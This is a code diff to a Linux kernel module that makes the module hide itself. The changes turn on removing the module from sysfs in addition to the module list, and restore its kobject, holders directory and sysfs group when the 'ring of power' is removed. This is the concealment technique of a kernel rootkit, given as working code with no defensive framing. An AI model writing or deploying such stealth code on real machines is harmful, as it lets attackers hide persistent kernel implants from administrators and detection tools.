@@ -9,6 +9,7 @@ static struct proc_dir_entry *_ops;
 static struct list_head *_module_list = NULL;
 static struct kobject *_kobj          = NULL;
 static struct kobject *_kobj_parent   = NULL;
+static struct kobject *_kobj_holder   = NULL;
 static struct attribute_group *_kgrp  = NULL;
 static const struct file_operations fops = {
     .owner      = THIS_MODULE,
@@ -86,8 +87,9 @@ void ring_on(void)
     list_del_init(&__this_module.list);             /* Remove from procfs */
     _kobj = &__this_module.mkobj.kobj;              /* Remember kobject */
     _kgrp = &(__this_module.sect_attrs->grp);       /* Remember sysfs group */
+    _kobj_holder = THIS_MODULE->holders_dir;
     _kobj_parent = __this_module.mkobj.kobj.parent; /* Remember kobject parent */
-//    kobject_del(&__this_module.mkobj.kobj);         /* Remove from sysfs */
+    kobject_del(&__this_module.mkobj.kobj);         /* Remove from sysfs */
 
     printk("The ring of power is applied.\n");
 }
@@ -98,19 +100,19 @@ void ring_off(void)
     /* Add the LKM back into the system module list */
     list_add(&__this_module.list, _module_list);
     barrier();
-/*
+
     if (kobject_add(_kobj, _kobj_parent, "eye") == -EINVAL)
     {
         kobject_put(_kobj);
         return;
     }
-*/
 
     /* Add the LKM back into the sysfs group */
-/*
-    sysfs_update_group(_kobj, _kgrp);
+
+    kobject_add(_kobj_holder, _kobj, "holders");
+
+    sysfs_create_group(_kobj, _kgrp);
     kobject_uevent(_kobj, KOBJ_ADD);
-*/
 
     printk("The ring of power is removed.\n");
 }
